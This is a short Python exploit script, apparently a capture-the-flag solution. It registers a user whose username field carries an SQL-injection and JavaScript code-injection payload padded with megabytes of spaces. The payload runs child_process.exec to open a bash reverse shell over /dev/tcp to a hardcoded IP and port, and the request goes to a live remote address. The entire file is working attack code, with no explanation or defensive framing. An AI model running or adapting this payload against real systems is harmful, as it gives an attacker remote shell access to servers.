from random import randint
import requests
payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/bin/bash -i >& /dev/tcp/192.168.119.130/12345 0>&1`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)
username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))
data = {
            'username': username+payload,
            'password': 'AAAAAA'
       }
print 'ok'
#url='http://127.0.0.1:31337/reg'
url='http://117.50.3.97:8003//reg'
response = requests.post(url, data=data);
print response.content
